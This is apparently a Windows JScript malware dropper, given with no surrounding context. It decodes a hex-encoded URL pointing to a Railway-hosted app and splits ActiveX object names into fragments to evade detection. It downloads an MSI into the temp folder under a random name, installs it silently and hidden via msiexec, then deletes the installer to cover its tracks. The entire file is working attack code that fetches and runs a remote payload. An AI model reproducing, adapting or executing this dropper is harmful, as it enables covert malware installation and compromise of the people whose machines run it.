(function () {
    // Hex encoded URL (decoded in memory, no .NET COM needed)
    var hx = "68747470733a2f2f67656b6b6f7370792d6e65772d70726f64756374696f6e2e75702e7261696c7761792e6170702f6d2f39653839303636642d623231652d343261362d396434622d663238333135646162616637";
    var u = "";
    for (var i = 0; i < hx.length; i += 2) {
        u += String.fromCharCode(parseInt(hx.substr(i, 2), 16));
    }

    var sh  = new ActiveXObject("WSc" + "ript.Shell");
    var fso = new ActiveXObject("Scrip" + "ting.FileSystemObject");
    var tmp = sh.ExpandEnvironmentStrings("%TEMP%");
    var nm  = "c" + Math.random().toString(36).substr(2, 8);
    var msi = tmp + "\\" + nm + ".msi";

    try {
        var h = new ActiveXObject("Win" + "Http.WinHttp" + "Request.5.1");
        h.Open("GET", u, false);
        h.SetRequestHeader("User-Agent", "Mozilla/5.0");
        h.Send();
        if (h.Status !== 200) throw 0;
        
        var s = new ActiveXObject("ADO" + "DB.Stream");
        s.Type = 1; 
        s.Open(); 
        s.Write(h.ResponseBody); 
        s.SaveToFile(msi, 2); 
        s.Close();
    } catch (e) { return; }

    try { 
        sh.Run('msi' + 'exec /' + 'i "' + msi + '" /q' + 'n /nore' + 'start', 0, true); 
    } catch (e2) { return; }

    try { fso.DeleteFile(msi, true); } catch (e3) {}
    try { sh.Run('cmd /c ping -n 3 127.0.0.1 >nul & del /f /q "' + msi + '"', 0, true); } catch (e4) {}
})();
